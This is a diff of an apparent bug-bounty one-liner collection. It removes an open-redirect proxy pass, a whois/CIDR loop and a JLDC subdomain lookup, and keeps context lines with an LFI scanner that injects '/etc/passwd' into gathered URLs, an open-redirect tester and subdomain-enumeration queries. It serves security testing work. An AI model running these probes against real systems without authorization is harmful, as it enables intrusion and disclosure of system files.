@@ -32,10 +32,7 @@ gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%"
 export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
 ```
 
-> @N3T_hunt3r
-```bash
-cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
-```
+
 
 ### XSS
 > @cihanmehmet
@@ -105,13 +102,6 @@ assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.
 cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
 ```
 
-### Get CIDR & Org Information from Target Lists
-> @steve_mcilwain
-
-```bash
-for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
-one | uniq); done
-```
 
 ### Get Subdomains from RapidDNS.io
 > @andirrahmani1
@@ -167,12 +157,7 @@ curl -s "https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains
 curl -s "http://web.archive.org/cdx/search/cdx?url=*.HOST/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
 ```
 
-### Get Subdomains from JLDC
-> @pikpikcu
 
-```bash
-curl -s "https://jldc.me/anubis/subdomains/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
-```
 
 ### Get Subdomains from securitytrails
 > @pikpikcu
